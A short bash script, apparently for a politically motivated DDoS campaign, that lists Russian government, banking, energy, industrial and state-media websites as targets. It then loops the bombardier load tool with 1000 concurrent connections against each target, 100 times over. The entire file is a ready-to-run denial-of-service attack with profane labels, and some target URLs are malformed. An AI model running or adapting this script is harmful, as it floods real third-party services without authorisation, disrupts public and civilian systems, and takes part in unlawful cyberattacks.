#!/bin/bash

# Best update targets from https://t.me/itarmyofukraine2022
fuck_these=(
    "https://api.sberbank.ru/prod/tokens/v2​/oauth"
    "​https://api.sberbank.ru/prod/tokens/v2​/oidc"
    "https://api.developer.sber.ru/product/SberbankID"
    "https://mail.rkn.gov.ru/" 
    "https://cloud.rkn.gov.ru" 
    "https://mvd.gov.ru" 
    "https://pwd.wto.economy.gov.ru/ " 
    "https://stroi.gov.ru/" 
    "https://proverki.gov.ru/"
    "https://www.gazprom.ru/"
    "https://lukoil.ru"
    "https://magnit.ru/"
    "https://www.nornickel.com/"
    "https://www.surgutneftegas.ru/"
    "https://www.tatneft.ru/" 
    "https://www.evraz.com/"
    "https://nlmk.com/"
    "https://www.sibur.ru/"
    "https://www.severstal.com/" 
    "https://www.metalloinvest.com/"
    "https://nangs.org/"
    "https://rmk"
    "https://www.tmk"
    "https://ya.ru/"
    "https://www.polymetalinternational.com/"
    "https://www.uralkali.com/"
    "https://www.eurosib.ru/" 
    "https://omk.ru/"
    "https://www.sberbank.ru"
    "https://www.vtb.ru/"
    "https://www.gazprombank.ru/" 
    "https://www.gosuslugi.ru/"
    "https://www.mos.ru/"
    "http://kremlin.ru/"
    "http://government.ru/" 
    "https://mil.ru/"
    "https://www.nalog.gov.ru/"
    "https://customs.gov.ru/" 
    "https://pfr.gov.ru/"
    "https://gov.ru/"
    "https://rkn.gov.ru/"
)

# Latest coordinated list, comment or remove these lines for long-running task
fuck_these=(
    "https://lenta.ru" 
    "https://ria.ru"
    "https://tvzvezda.ru"
    "https://tass.ru"
    "https://5-tv.ru"
    "https://rg.ru"
    "https://rtr-planeta.com"
    "https://economy.gov.ru" 
    "https://smotrim.ru"
    "https://ac.gov.ru" 
    "https://vgtrk.ru"
    "https://data.gov.ru"
    "http://council.gov.ru/" 
    "http://duma.gov.ru/"
    "https://rkn.gov.ru/"
    "https://www.gosuslugi.ru/" 
    "https://www.gov.spb.ru" 
    "http://kremlin.ru/" 
    "https://mchs.gov.ru"
)

for n in {1..100}; do 
    for i in "${fuck_these[@]}"
        do
        echo "Fucking - $i"
        bombardier -c 1000 -d 60s -l $i --http1
        echo "Fucked - $i"
        sleep 5
    done
done

